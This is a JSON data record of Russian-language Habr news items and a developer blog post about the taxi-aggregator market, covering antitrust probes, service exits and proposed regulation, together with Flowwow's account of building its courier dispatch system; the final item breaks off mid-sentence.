{"info": {"rate": null, "subs": null, "industries": null, "about": "информационный сервис, услуги по перевозке были оказаны независимыми перевозчиками."}, "refs": [["Минтранс предлагает новую версию законопроекта «Об организации перевозок пассажиров и багажа легковым такси в РФ и о внесении изменений в отдельные законодательные акты РФ». Ведомство предлагает обязать службы заказа легкового такси предоставить «автоматизированный удаленный доступ» к своим информационным системам и данным Федеральной службе безопасности. Под это требование должны попасть данные, «используемые для получения, хранения, обработки и передачи заказов легкового такси».Кроме того, от агрегаторов потребуют передавать сведения о перевозках, в том числе о местоположении такси и водителя, в Региональную навигационно-информационную систему (РНИС; платформа по управлению и мониторингу транспортной инфраструктуры в российских регионах).Законопроект уже согласовали Минюст, Ространснадзор, Минтруд, Минфин, Минэкономразвития, Минпромторг, ФНС и Минздрав.В Минюсте подтвердили, что документ находился на рассмотрении у ведомства, а «заключение по результатам проведения его правовой и антикоррупционной экспертизы было направлено в Минтранс». Также Минтранс предлагает:ввести минимальный тариф на перевозку пассажиров и багажа,ограничить количество легковых такси для каждого региона,обязать устанавливать устройства контроля за вниманием и усталостью водителя,ввести ответственность агрегаторов в случае причинения вреда жизни, здоровью или имуществу пассажира, если у водителя не было разрешения или оно было аннулировано,ввести региональные реестры перевозчиков, легковых такси и служб заказа легковых такси,обязать агрегаторы открывать представительства в регионах присутствия, заключать договор с самозанятыми и др.Авторы документа указывают, что вопросы оказания услуг по перевозке грузов, пассажиров и багажа самозанятыми гражданами без образования юрлица или регистрации в качестве ИП в законодательстве не урегулированы. В «Ситимобиле» отмечают, что новый законопроект «во многом повторяет отклоненные ранее редакции, в том числе получившие негативные отзывы участников рынка». «Мы надеемся, что новая редакция законопроекта не будет вводить ограничительные и затратные меры для участников отрасли, которые будет сложно выполнить в текущих экономических условиях. Мы считаем важным найти компромиссный вариант регулирования, который позволит обеспечить безопасность поездок, но при этом не приведет к резкому “сжатию” сферы такси», — заявляет компания. Агрегатор отмечает, что сейчас он не хранит данные о поездках пользователей.Председатель Общественного совета по развитию такси в регионах России Ирина Зарипова считает, что регулирование рынка такси необходимо, но с учетом текущей экономической ситуации принятие законопроекта лучше было бы отложить до осени. В марте «Ситимобил» объявил, что прекращает деятельность в России. Руководство компании рассказало, что акционеры решили прекратить развитие проекта, так как он не стал прибыльным даже при доле рынка в 30%.Агрегатор Gett также принял решение о реорганизации российского подразделения.В феврале китайский агрегатор такси DiDi заявил, что уйдет с российского и казахского рынков. В середине лета 2021 года Ассоциация «Национальный совет такси» пожаловалась Путину, заявив, что приложение агрегатора имеет доступ к личным данным чиновников и правоохранителей, которые пользуются услугами DiDi.  Между тем в Латвии остановили работу сервиса «Яндекс.Такси», а также заблокировали мобильное приложение «Яндекс Go» за передачу и хранение данных пользователей на серверах в России.", {"day": "29", "month": "марта", "time": "10:55"}, {"rate": 7, "views": 3500}], ["По информации «РИА Новости», агрегатор такси «Ситимобил» прекращает деятельность в России. В компании работали более 1 тыс. сотрудников, а в дни высокого спроса сервис обрабатывал по 540 тыс. заказазов на поездки в день\n\r\nРанее «Ситимобил» объединял в себе три сервиса: заказ такси, краткосрочную аренду автомобилей «Ситидрайв» и электросамокаты Urent. Каршеринг доступен в Москве, Санкт-Петербурге и Сочи. Прокатиться на самокатах можно во всех городах-миллионниках страны.\n\r\nСегодня акционеры сервиса приняли решение о прекращении деятельности компании. В компании уточнили, что все обязательства перед сотрудниками и партнерами сервиса будут выполнены в полном объеме в рамках закона, а сервис каршеринга «Ситидрайв» продолжит работу. Причины закрытия сервиса компания не уточнила. \n\r\n«Ситимобил» входил в группу VK (Mail.ru Group) в составе совместного предприятия VK и «Сбера» в области транспорта и доставки еды — «О2О Холдинг». Агрегатор такси начал свою деятельность в 2007 году и был доступен до закрытия в 80 городах России. Компания занимала второе место по количеству онлайн-заказов поездок в Москве и в большинстве городов присутствия.\n\r\nСегодня агрегатор такси Gett принял решение о реорганизации российского подразделения.", {"day": "11", "month": "марта", "time": "20:20"}, {"rate": 8, "views": 20000}], ["Как сообщает издание Wired, с 1 марта 2022 года в Китае запретят использовать личную информацию для формирования индивидуальных цен на товары и услуги и принудит компании запрашивать разрешение у пользователей на использование их данных для составления рекомендаций. Новые правила охватывают алгоритмы, которые устанавливают цены, манипулируют результатами поисковой выдачи, рекомендуют видео и фильтруют контент. Они коснутся компаний, занимающихся рекламой и электронной коммерцией, а также стриминговых сервисов и социальных сетей. Соответствующий законопроект был сформирован Администрацией киберпространства Китая. В нём прописано, что компании будут обязаны запрашивать у пользователей разрешение на сбор контента для формирования индивидуальных рекомендаций. Правила также обеспечивают защиту работников службы доставки, водителей такси и так называемых «Gig worker» (фрилансеры, временные исполнители заказов, работники по контракту). Кроме уже перечисленных мер документ запрещает продвижение вызывающего привыкание контента и применение политики, способствующей появлению зависимости или чрезмерного потребления. Компании будут обязаны поддерживать общепринятые ценности, «решительно распространять позитивную энергию» и предотвращать или ослаблять разногласия или споры. В качестве показательного примера организаций, пользующихся нейросетями для индивидуального ценообразования, Wired приводит агрегаторов такси. Они используют данные об истории поездок и модели телефона (возможно, не только их), чтобы выставлять разным пользователям разные цены на услуги, максимизируя свою выручку. С введением запрета такая деятельность будет признана противозаконной. Схожие алгоритмы ценообразования используют и российские агрегаторы такси. ФАС в феврале этого года запросила у «Яндекс.Такси», DiDi, «Ситимобил» и Gett объяснение резкому повышению цен на такси в Москве и Казани (на 24% год к году). Компании также должны были объяснить разницу в стоимости одной и той же услуги при заказе с разных моделей смартфонов. Сразу после этого антимонопольный департамент Евразийской экономической комиссии (ЕЭК) сообщил о ценовом сговоре между указанными агрегаторами. ЕЭК подал соответствующее заявление в ФАС и, если факт сговора подтвердится, компаниям грозит штраф до 15% годовой выручки.", {"day": "22", "month": "февраля", "time": "19:49"}, {"rate": 5, "views": 1100}], ["Китайский агрегатор такси DiDi уйдет с российского и казахского рынков 4 марта, сообщает агентство «Интерфакс» со ссылкой на PR-директора сервиса Ирину Гущину. Компания запустила работу сервиса в Казани в августе 2020 года, а затем Didi стала расширяться за счет других регионов страны.Гущина отмечает, что поводом для сворачивания деятельности компании послужили изменения рыночных условий и другие сложности. В связи с этим DiDi не сможет обеспечивать лучшие результаты в России и Казахстане.Компания уже сообщила своим водителям о скором закрытии сервиса.DiDi продолжит работать в государствах Латинской Америки, а также в некоторых странах Ближнего Востока, Африки и Тихоокеанского региона.В начале февраля Евразийская экономическая комиссия обвинила DiDi, «Яндекс», Gett, «Ситимобил» и Bolt в сговоре с целью установления и поддержания согласованных цен на рынке такси. Если ФАС России выявит нарушения, то компаниям будет грозить штраф в размере 15% от выручки.В конце прошлого года издание Financial Times рассказало о том, что за девять месяцев выручка DiDi упала на $6,3 млрд. Данные убытки связаны с действиями регулирующих органов Китая, которые запрещают компании выйти на IPO в Нью-Йорке без разрешения китайских властей.В конце декабре 2021 года DiDi заявила о намерении выйти на московский рынок в начале 2022 года. На тот момент компания присутствовала в 37 российских городах. В середине декабря Uber сообщила, что продаст свою долю в DiDi, ссылаясь на непрозрачность рынка в Китае. Uber покинула КНР в 2016 году, не выдержав конкуренции с DiDi. Американская компания продала активы китайскому агрегатору в обмен на долю.Летом прошлого года сервис такси «Максим» подал в ФАС жалобу с обвинением DiDi в демпинге цен. Однако в сентябре антимонопольщики не усмотрели признаков недобросовестной конкуренцииВ середине лета Ассоциация «Национальный совет такси» пожаловалась Путину на DiDi. Пятьдесят компаний обвинили китайский агрегатор в том, что его приложение имеет доступ к личным данным чиновников и правоохранителей, которые пользуются услугами DiDi.", {"day": "21", "month": "февраля", "time": "19:42"}, {"rate": 8, "views": 2600}], ["По информации издания «Известия», антимонопольный департамент Евразийской экономической комиссии (ЕЭК) обнаружил признаки ценового сговора в работе агрегаторов такси «Яндекс», DiDi, Gett, «Ситимобил» и Bolt при работе этих сервисов в странах ЕАЭС. Материалы по этому делу ЕЭК передал для изучения в Федеральную антимонопольную службу (ФАС) России. В случае подтверждения нарушения компаниями антимонопольного законодательства, ФАС может оштрафовать агрегаторов. Причем сумма административного наказания может составить до 15% выручки за прошлый год.\n\r\nЕЭК является регулирующим органом работы ЕАЭС. Комиссия не может самостоятельно штрафовать компании, если выявила нарушения на территории отдельных стран-членов ЕАЭС. \n\r\nЭксперты ЕЭК выяснили, что в России, Армении, Киргизии, Казахстане и Белоруссии действует несколько крупных агрегаторов такси, которые хоть и относятся к разным юрлицам, но по факту принадлежат и управляются одними компаниями и они же устанавливают определенные тарифы на поездки, причем во многих случаях их стоимости поездок идентичны.\n\r\nЕЭК подозревает, что агрегаторы используют схожие алгоритмы ценообразования, способы динамического вычисления стоимости поездок и держат на одинаковом уровне тарифы своих услуг для водителей, чтобы регулировать рынки стран, где они работают.\n\r\nПредставители агрегаторов рассказали изданию, что они не согласны с выводами расследования ЕЭК, так как их юрлица работают в соответствии с законодательством и нормами регулирования рынка и соблюдают все требования регуляторов. \n\r\nЮристы уточнили изданию, что если ФАС обнаружит в переданных материалах от ЕЭК признаки нарушения агрегаторами запрета на ограничение конкуренции, который предусмотрен ст. 11 ФЗ «О защите конкуренции», то может назначит сервисам миллиардные оборотные штрафы.\n\r\nВ 2021 и 2022 годах ФАС уже несколько раз интересовалась деятельностью агрегаторов такси в России.\n\r\n20 февраля 2021 года ФАС начала проверку повышения цен до пяти раз агрегаторами и службами такси «Яндекс.Такси», «Ситимобил», Gett, «Везет» и «Максим» во время снегопада в Москве. Регулятор также планировал изучить влияние агрегаторов, в том числе Uber и «Яндекс.Такси», на рынок такси в целом в рамках выявления картельного сговора. \n\r\n31 января ФАС запросила у «Яндекс.Такси», DiDi, «Ситимобил» и Gett предоставить объяснение резкому повышению цен на такси в Москве и Казани. Также агрегаторы должны пояснить ведомству, почему отличается стоимость одной и той же услуги при заказе с разных моделей смартфонов, например, с дорогих устройств цена за поездку выставляется выше.", {"day": "7", "month": "февраля", "time": "15:47"}, {"rate": 6, "views": 4200}], ["3 февраля 2022 года «Яндекс» начал показывать в сервисе «Яндекс Go» индекс спроса на такси. Теперь пользователи при заказе такси могут узнать причину, почему им алгоритм «Яндекса» рассчитал такую высокую стоимость поездки или наоборот снизил текущую стоимость услуги.\n\r\nВведением данной опции «Яндекс» пытается объяснить, что динамическое ценообразование полезно и целесообразно. В компании надеются, что нововведение поможет пользователям сэкономить — они смогут следить за спросом и вызвать машину, когда цена поездки будет ниже.\n\r\nНовый индикатор в сервисе «Яндекс Go» показывает, в каких случаях пользователь может столкнуться с большим спросом на поездки и недостаточностью свободных машин неподалеку. \n\r\n«Яндекс» пояснил, что спрос выше в плохую погоду и в праздники, поэтому сервис повышает стоимость поездки, чтобы привлечь больше водителей. Если индикатор индекса спроса желтый, оранжевый или красный, то стоимость поездки выше, чем в обычное время. \n\r\n«Яндекс» не раскрыл, как часто сейчас у пользователей возникает не зеленый индикатор индекса спроса.\n\r\n«Яндекс» рассказал, что всегда повышает стоимость поездки при повышенном спросе, чтобы машины в таких ситуациях находились на линии и приезжали за считанные минуты, а не часы.\n\r\n«Яндекс» советует тем клиентам, кому очень нужно уехать — заказывать такси по повышенному тарифу. Компания рекомендует пользователям, кому не нравится высокая цена поездки, подождать, пока она не станет стандартной. Но это может занять несколько часов.\n\r\n31 января ФАС запросила у «Яндекс.Такси», DiDi, «Ситимобил» и Gett предоставить объяснение резкому повышению цен на такси в Москве и Казани. Также агрегаторы должны пояснить ведомству, почему отличается стоимость одной и той же услуги при заказе с разных моделей смартфонов, например, с дорогих устройств цена за поездку выставляется выше.\n\r\n«Яндекс» рассказал Forbes, что «модель смартфона, уровень заряда, количество антител у пользователя, его настроение и чувство юмора никакого отношения к ценообразованию заказа не имеют». В компании настаивают, что в «Яндекс.Go» применяется модель динамического ценообразования. Это означает, что стоимость поездки формируется автоматически с учетом свободных машин, которые находятся рядом с пользователем, погоды, загруженности дорог, продолжительности и протяженности поездки. \n\r\nВ середине декабре 2021 года СМИ сообщили, что средняя поездка в такси в Москве за год подорожала почти на 25%. Представители общественной организации тогда заявили, что наблюдают манипуляции на этом рынке со стороны агрегаторов. Они не зафиксировали увеличения среднего времени подачи машин по городу, а вот текущие поездки по их данным подорожали почти в два раза.\n\r\nПредставители агрегаторов, включая «Яндекс» и «Ситимобиль» рассказали, что все нормально, так как в декабре всегда спрос на такси возрастает, скорость движения машин медленнее обычного, уровень пробок выше, а их алгоритм вычисляет, что поездка займет больше времени и будет стоить в итоге дороже. Они не заметили значительного роста в разы стоимости поездок и советуют пользователям в случаях, когда их не устраивает цена, выбирать более высокий класс обслуживания, где стоимость поездки может быть даже меньше в период высокого спроса.\n\r\nУправляющий директор группы компаний «Яндекса» Тигран Худавердян по этой ситуации заявил, что повышение цен в «Яндекс.Такси» связано с закрытием границ и нехваткой водителей на фоне повышенного спроса. По его словам, алгоритм сервиса старается сохранить баланс между предложением и спросом. Снижение цены приведет к увеличению спроса, а это будет чревато тем, что сделать заказ и дождаться такси будет затруднительнее. Поэтому компания не уменьшает стоимость поездок.", {"day": "3", "month": "февраля", "time": "11:43"}, {"rate": 9, "views": 27000}], ["По информации российского издания Forbes, в 31 января Федеральная антимонопольная служба (ФАС) России запросила у «Яндекс.Такси», DiDi, «Ситимобил» и Gett предоставить объяснение резкому повышению цен на такси в Москве и Казани. Также агрегаторы должны пояснить ведомству, почему отличается стоимость одной и той же услуги при заказе с разных моделей смартфонов, например, с дорогих устройств цена за поездку выставляется выше.\n\r\nИнициатором запроса стали депутаты Госдумы. Они выяснили, что в начале 2022 года стоимость поездок на такси выросла на 24% по сравнению со средней ценой в 2021 году.\n\r\nФАС пояснила, что у агрегаторов есть 10 дней на предоставление отчета о количестве поездок пользователей из Москвы и Казани и их стоимости в период с 1 ноября 2020 года по 31 января 2021 года, а также в период с 1 ноября 2021 года по 31 января 2022 года. \n\r\nВдобавок ФАС ждет ответа на запрос по поводу использования агрегаторами технологий, позволяющих определить модель смартфона, с которого пользователь заказывает услугу такси. Ведомство просит объяснить факты установления различных цен на одну и ту же поездку в зависимости от типа мобильного устройства, с которого пассажир оформляет заказ. \n\r\nПо итогам предоставления ответов ФАС их изучит и проверит. Если компании предоставят ФАС заведомо ложную информацию или не предоставят ответы в указанный срок, то на них может быть наложен штраф до 500 тыс. рублей.\n\r\nПредставитель ФАС пояснил изданию, что действительно такое письмо было выслано агрегаторам. Он уточнил, что ведомство не может влиять на динамическое ценообразование, а только может вмешаться в ситуацию, если обнаружит на рынке нарушения антимонопольного законодательства.\n\r\n«Яндекс» рассказал Forbes, что «модель смартфона, уровень заряда, количество антител у пользователя, его настроение и чувство юмора никакого отношения к ценообразованию заказа не имеют». В компании настаивают, что в «Яндекс.Go» применяется модель динамического ценообразования. Это означает, что стоимость поездки формируется автоматически с учетом свободных машин, которые находятся рядом с пользователем, погоды, загруженности дорог, продолжительности и протяженности поездки. \n\r\nВ середине декабре 2021 года СМИ сообщили, что средняя поездка в такси в Москве за год подорожала почти на 25%. Представители общественной организации тогда заявили, что наблюдают манипуляции на этом рынке со стороны агрегаторов. Они не зафиксировали увеличения среднего времени подачи машин по городу, а вот текущие поездки по их данным подорожали почти в два раза.\n\r\nПредставители агрегаторов, включая «Яндекс» и «Ситимобиль» рассказали, что все нормально, так как в декабре всегда спрос на такси возрастает, скорость движения машин медленнее обычного, уровень пробок выше, а их алгоритм вычисляет, что поездка займет больше времени и будет стоить в итоге дороже. Они не заметили значительного роста в разы стоимости поездок и советуют пользователям в случаях, когда их не устраивает цена, выбирать более высокий класс обслуживания, где стоимость поездки может быть даже меньше в период высокого спроса.\n\r\nУправляющий директор группы компаний «Яндекса» Тигран Худавердян по этой ситуации заявил, что повышение цен в «Яндекс.Такси» связано с закрытием границ и нехваткой водителей на фоне повышенного спроса. По его словам, алгоритм сервиса старается сохранить баланс между предложением и спросом. Снижение цены приведет к увеличению спроса, а это будет чревато тем, что сделать заказ и дождаться такси будет затруднительнее. Поэтому компания не уменьшает стоимость поездок.\n\r\nВ конце декабря 2021 года Департамент транспорта Москвы попросил агрегаторов не повышать стоимость поездок на такси в праздники. Дептранс пояснил, что пока законодательно тарифы агрегаторов на услуги такси не регулируются, но они не должны выходить за определенные рамки. Ведомство считает, что сервисы такси должны устанавливать «адекватные цены и не поднимать стоимость поездок в канун Нового года и новогодних каникул, так как такси должно оставаться комфортным, доступным и удобным».", {"day": "2", "month": "февраля", "time": "12:10"}, {"rate": 3, "views": 3600}], ["Привет, Хабр. Меня зовут Андрей, я бэкенд-разработчик в команде Flowwow. Я довольно давно работаю в компании и хочу рассказать об истории создания  собственного сервиса доставки (не без боли) и интеграциях с крупными игроками, которые нам удалось реализовать. Приходит тот день, когда бизнес задает себе философский вопрос «что дальше?», в нашем случае это «куда расти маркетплейсу?». Такой вопрос касается всей команды, включая ИТ. Увидев бэкенд в моей роли, вы наверняка ожидаете техническую мясорубку. Не без этого, но во многом хочу рассказать про сам путь. Мы развиваем платформу Flowwow, это маркетплейс для продавцов и покупателей, где магазины размещают свои товары, клиенты выбирают, а курьеры принимают заказы на доставку. Доставка цветов и подарков — дело деликатное. Вы можете выбрать прекрасный букет, его соберут из свежих цветов, но есть финальный, самый важный штрих, — доставка. Пару лет назад мы поняли, что здесь не все зависит от нашего сервиса. И это нужно исправить. Было две предпосылки:желание расти и масштабировать бизнес,автоматизация ручных процессов.Сейчас у нас средняя оценка всего клиентского сервиса 4,9. И, конечно, к такому результату мы пришли не сразу — через боль, ошибки и забавные истории. Обо всем по порядку. Доставка 1.0. Свободу для всехСначала у нас было желание создать сервис со свободным входом людей, где каждый мог поработать курьером и заработать сумму на карманные расходы. Все просто: курьер регистрируется в приложении, указывает свое имя, присылает фото персональных данных и видео о себе. После нам требовалось время на модерацию, иногда до 3–4 дней. Успешное ее прохождение = уведомления о новых заказах.Подход выявил, что люди есть люди, у них бывают свои проблемы, которые часто лежат вне технической плоскости. Например, курьеры могли заболеть, пропасть в виду форс-мажоров или просто утилизировать подарок в ближайшей урне по своим личным причинам. Это помимо проблем языкового барьера и незнания карты города. Тук-тук, вам букетМы пробовали решить вышеописанные проблемы — блокировать средства с банковских карт курьеров до завершения доставки, создавать интерактивную карту с указанием маршрута, предварительными уведомлениями о начале работы и высоком спросе в конкретное время. В результате при росте числа курьеров мы получили еще проблемы:Экспоненциальный рост ручного сопровождения доставки со стороны нашей поддержки;Видимый рост проблем в полях: курьеры могли не понимать, как работает приложение, или просто теряться в городе;Невозможность прогнозировать загруженность доставки в определенный период и, соответственно, управлять количеством заказов.Было принято волевое решение, и проект в первой редакции был приостановлен.Доставка с помощью других или доставка 2.0С ручным контролем покончено, и надо автоматизировать все, что можно автоматизировать. Какой у нас есть вариант? Отдадим операционные процессы на откуп третьему лицу, а там уже будут заниматься нашими делами, за комиссию. В третьи лица мы заложили более дружелюбный подтекст и назвали их «кураторами» курьеров. Это были отдельные специалисты на аутсорсе, которые следили за исполнением доставки. В их распоряжении — админка, сделанная специально для них, в подчинении — курьеры с товарами. Мы провели обучение кураторов, подготовили видеоматериалы, рассказали, как работать с курьерами, находящимися в подчинении, как пользоваться админкой и назначать заказы на доставку. И принялись наблюдать.POV: курьер доставляет букетДевушка возвращается домой, идет по улице спального района. Ее догоняет машина. Водитель-курьер, включив эмпирический метод, протягивает ей букет на ходу через окно машины — держите, вам цветы! Девушка возмущена и тут же звонит своему другу, чтобы рассказать о ситуации. Друг тоже возмущен, так как эти цветы от него (таки да, водитель угадал). Девушка бежит за машиной по дворам, успевает на светофоре и отбирает букет у водителя, тоже на ходу.Это история со счастливым концом, и все это забавно на бэке, но представьте, что этот букет — ваш сюрприз близкому человеку. Еще были недопонимания со стороны кураторов: после недели работы один из них заявил «А я думал надо только комиссию собирать с курьеров». Ну, возвращаемся снова к ручному контролю — на еженедельной основе созваниваемся с кураторами, объясняем, зачем они здесь и какие функции выполняют. После трех недель стало ясно, что со стороны очень сложно найти человека, который бы понимал весь бизнес-процесс доставки, и мы взяли специалиста по обучению кураторов. И еще добавили специалистов в техподдержку. А еще взяли нового менеджера. В общем, начали закрывать проблемы людьми. После трех месяцев мы поняли, что такой подход тоже не до конца рабочий.К каким выводам пришли:что плохо, когда кураторы — люди извне. Они не горят общим делом компании, не болеют за сервис и качество и назначают курьеров без какой-либо модерации;что плохо, когда нужно подключать еще людей для контроля процесса, это не похоже на автоматизацию.Мы снова приостановили проект, поняв, что с этим надо что-то делать, что-то делать… Доставка 3.0. Или каждому курьеру по заказуПроанализировав вышеописанные проблемы, мы решили реализовать сервис заново и сильно изменили подход к логике приема курьеров и выдачи заказов курьерам. Какая теперь логика? Пройдемся по пунктам: Найм курьеровКурьер должен оформиться как самозанятый. На его счет мы будем производить автоматические выплаты за выбранный период работы. Такое изменение позволило автоматизировать процесс выплаты, включая управление штрафами и бонусами для конкретного курьера. Расписание работыВ старой системе не было никакого понимания, сколько людей будет завтра, в каких районах они могут начать работу и как правильно распределить нагрузку заказов по ним. В новой редакции мы добавили график работы курьера и закрепили уведомления о новых заказах только для пользователей, которые работают в этот день.Поиск курьера Мы убрали возможность принимать заказ за 2-3 дня до его даты доставки. По статистике, 30% таких заказов либо не доставлялись вовсе, либо доставлялись другими курьерами после отказа на ранее назначенного. Это очень большой процент, который нервировал наших клиентов и создавал много операционной деятельности магазину и сервису.Алгоритмы для заказовЭто отдельный сервис внутри сервиса, здесь мы учитываем множество факторов: Так вот, что внутри:hotspot, или горячая точка. Это магазин, где потенциально может появиться заказ. Будь в хотспоте и ты получишь приоритет по заказу.приоритетный заказ: Курьер может указать какой-либо район в качестве домашнего, с которого он начнет свою работу. Находясь в этом районе, курьер может увидеть заказ на 3 минуты раньше остальных и, соответственно, оперативнее всех принять его. начало поиска: обычно поиск начинается за 25 минут до времени прихода в магазин. Мы находим всех курьеров, которые не имеют заказов и находятся достаточно близко к нужному магазину. Далее в порядке увеличения расстояния уведомляем курьера, давая ему 20 секунд на принятие решения —  брать заявку в работу или нет. Если заявка не принята, идем к следующему свободному, и так далее, пока заказ не будет принят, либо пока не закончатся потенциальные кандидаты. А что тогда?ищем после завершения поиска: после того, как работа по поиску завершилась, а заказ все еще не нашел своего курьера, мы запускаем поиск раз в минуту по всем имеющимся заказам. Минута и правда имеет значение, какие-то новые курьеры могли освободиться, а какие-то, возможно, подъехали к магазину поближе. Если найдены те, кому не приходили уведомления, то присылаем им инфу о новой заявке.горящий заказ: если за 15 минут никто не принял заказ — его зона видимости расширяется, он будет отмечен иконкой горящего пламени. А если его принять и выполнить, то будут начислены бонусные очки для участия в топ-рейтинге курьеров.дополнительный заказ: если курьер принимает заказ, алгоритм подскажет, когда можно взять смежный заказ — забрать из одного магазина и успеть доставить вовремя сразу несколько товаров.расчетное время, тут учитываем все расстояния: пока курьер доберется до магазина, пока в магазине соберут букет и пока букет на доставке до клиента.«карта предсказаний»: разработали алгоритм для курьеров, который показывает, где сейчас можно гарантировано получить заказ. Такая механика помогает доставщикам зарабатывать и сильно разгружает в пики, например, праздничные дни, вроде 14 февраля или Дня матери. Мы любим шутить, что у нас новый год начинается с 8 марта, свой flowwow-календарь для летоисчисления.расчет пути на своей стороне: Известно, что дистанцию между двумя координатами можно рассчитать разными способами: можно использовать простые расчеты на координационной сетке, можно использовать реализации расчета по прямой с учетом эллипсоида земли, можно обращаться к внешним агрегаторам для расчета расстояния между двумя точками. Мы выбрали смежный алгоритм расчета. Там, где производительность важнее, считаем по прямой. Если нужен корректный маршрут по дорогам, то просчитываем маршрут посредством карт в открытом доступе. Для этого разворачиваем провайдеров расчета в непосредственной близости от физического расположения нашего серверного ПО. Мы выбрали провайдера graphhopper для поиска расстояний и подняли его на отдельной машине. В результате время ответа составляет около 10 мс, а система позволяет считать до 300 маршрутов одновременно. Это решение позволило сильно сократить время ответа нашего серверного ПО и значительно сократило расходы на расчет дистанции через гигантов сервиса Google.К чему мы пришли:  качество доставки заметно выросло — более 60% роста за полгода;стало больше курьеров и заказов: симметрично растет количество заказов и курьеров, а главное — появились курьеры, постоянно работающие с нашим сервисом;автоматизация процесса оповещения о новом заказе улучшила процесс доставки и для курьеров, и для клиентов. Но решили не останавливаться:курьеры хотят больше заказов;магазины и клиенты хотят более быструю доставку;мы хотим, чтобы все были довольны друг другом. Поэтому новый шаг нашего пути — интеграция с партнерами.Интеграция с другими партнерамиДолго ли, коротко ли, а мы уперлись в дилемму курицы и яйца. Количество курьеров не растет, потому что заказов не хватает для роста, а количество подключенных магазинов не удается увеличивать, потому что увеличение числа заказов потенциально увеличивает шанс, что он не будет доставлен сервисом по причине занятости всех курьеров. Как выбраться из порочного круга?Здесь нам предстоял еще один интересный этап, где нужно подстроить существующий собственный сервис и алгоритмы под техническую реализацию других. Мы выбрали для себя партнеров — это Яндекс GO и Gett. Определили плюсы интеграции, как она поможет нам масштабироваться:рост курьерской базы и больше возможностей зарабатывать;увеличение числа магазинов на маркетплейсе;безболезненный заход в новые города и регионы для бизнеса;довольные клиенты: больше выбора и быстрее доставка :).Первыми интегрировали Яндекс.Доставку. Срастили их статусы доставок с нашими и выявили некоторые сложности совместной работы:Еще одно звено доставки с необходимостью коммуницировать с ней;«Социальные маневры» курьеров от партнера начинают влиять на процесс доставки.Курьеры партнера научились использовать особенности их системы и подстраиваться под алгоритмы. Например, если им надо пообедать, но неохота пропускать заказ. Что происходит: они назначают заявку доставки на себя, но не выдвигаются в магазин, а быстро перекусывают в ближайшем кафетерии. Таких людей хорошо видно по координатам. И сервис тоже заметит. В таком случае будет сформирован репорт в технический канал с дальнейшей отработкой заявки через поддержку.Нет гарантии того, что заказ найдет курьера.Например, в системе партнера заказ должен автоматически отменяться через полчаса. Только вот в случае отложенной заявки (заявки на определенное время) заказ отменяется через полчаса после указанного времени. Итак, забавная математика. Есть один курьер, дано время прибытия в магазин — 10:00. Через сколько мы узнаем, что заказ так никто и не доставит? ˙ɐɔɐҺvоu :ɯǝʚɯоЭто потеря времени для магазина и потенциальное опоздание по заявке для нас. Мы смогли обойти эту проблему, организовав на своей стороне проверку: если время прихода в магазин прошло, а курьер все еще не назначен на заявку, мы перезапускаем ее без указания времени прихода в магазин, т.е. на «как можно быстрее». Наша версия маховика времени :)  Если же время доставки окажется в прошлом, то система автоматически пересчитает время доставки на новое время и заново перезапустит заявку. Ведь лучше доставить заказ с опозданием, чем вообще его отменить.Далее мы решили попробовать в качестве партнера еще одну доставку Gett.Алгоритмы для доставки и статусы доставки прекрасно легли на новую интеграцию и все внедрение заняло менее месяца.Алгоритм отправки на партнера был создан с учетом требований партнеров, и каждую из доставок мы оборачиваем в набор правил, пересоздания и перезапуска сценария доставки. Изначально циклическое исполнение заявки выглядит следующим образом:Заявка создается в нашем доставке.Если за 30 минут с момента начала поиска курьер не найден, то мы отправляем доставку на Gett.Если за 5-10 минут для заявки на Gett не будет найден курьер, то мы передаем заявку на доставку Яндекса.Заявка будет находиться на доставке Яндекса до момента доставки или до момента ее ручного перевода на другой тип доставки.Конечно же, эти автоматизированные алгоритмы могут не учитывать фактические потребности бизнеса, и администратор нашего проекта может самостоятельно перезапускать заявки на того или иного партнера.Но мы все же смогли достичь своей цели: курьеры стали брать больше заказов; магазины получили гарантии доставки заказа нашими силами или силами партнера;мы смогли продолжить рост курьерской базы и объема подключаемых к нам магазинов.И снова вопрос «что дальше?»Мы прошли большой путь в три с половиной года — от ручного сервиса, в котором люди брали заказы в свободное время, до полноценного сервиса с гарантированной доставкой и курьерской работой. Итоги не обходятся без цифр:средняя оценка доставки от клиентов 4,9, эта цифра радует нас в админке всего сервиса ;среднее время обработки заказа – 46 минут по Москве;доставка нашим сервисом составляет 80% от общего числа заказов;более 100 курьеров работает каждый день.Нам все еще хочется задавать вопрос «что дальше?». Здесь мы видим зоны роста для адаптации алгоритмов под новые регионы и для создания системы поощрения наших курьеров. Буду рад комментариям, идеям и обмену опытом!", {"day": "24", "month": "декабря", "time": "15:55"}, {"rate": 8, "views": 1400}], ["Китайский агрегатор такси DiDi начнет работать в Москве в начале следующего года. Компания уже ведет переговоры с властями города об условиях сотрудничества. DiDi присутствует в России с 2020 года и сегодня работает в 37 городах, включая Краснодар, Уфу, Тамбов, Саратов, Брянск и другие.О выходе компании на московский рынок сообщил портал Autonews со ссылкой на собственные источники в мэрии города. В DiDi точную дату начала работы пока не называют.«Москва — крупнейший рынок в сегменте такси и райдхейлинга в России, и, безусловно, мы находим его привлекательным. Однако говорить о конкретных датах начала работы пока преждевременно. Мы будем делиться новостями по мере развития событий», — пообещала изданию PR-директор DiDi в России Ирина Гущина.Сегодня большая часть поездок в московских такси приходится на «Яндекс» (71,8% поездок). На втором месте — «Ситимобил» с 19,2%. У Gett доля от заказов составила 6,3%. Оставшиеся поездки поделились между небольшими сервисами и приложениями. При этом в 2020 году в Москве и области был зарегистрирован 31 бренд такси-агрегаторов. На прошлой неделе стало известно, что Uber намерена продать свою долю в DiDi из-за непрозрачности рынка страны. По словам главного исполнительного директора Uber Дары Хосровшахи, доля DiDi не является стратегически важным активом. Компании принадлежит 12,8% акций китайского агрегатора.DiDi в этом году находится под пристальным вниманием китайского регулятора из-за проведенного летом IPO. По информации издания Bloomberg, Управление по вопросам киберпространства КНР (Cyberspace Administration of China, САС) потребовало у DiDi Global разработать план ухода с американских бирж, в том числе с Нью-Йоркской фондовой биржи на Уолл-Стрит (New York Stock Exchange, NYSE). Ведомство опасается утечки конфиденциальных данных.", {"day": "20", "month": "декабря", "time": "21:01"}, {"rate": 8, "views": 2800}], ["Компании из самых разных отраслей развивают собственные программные и облачные платформы. Одна из таких компаний - Gett. Она развернула международную платформу для бизнеса по управлению наземным транспортом. И платформа продолжает расширяться - на днях компания объявила о расширении пула партнеров, предоставляющих транспортные услуги, на рынке B2B до 2 тысяч компаний. Подробнее о проекте - в продолжении.Что это за платформаМеждународная software-платформа по управлению наземным транспортом (ground transportation management, 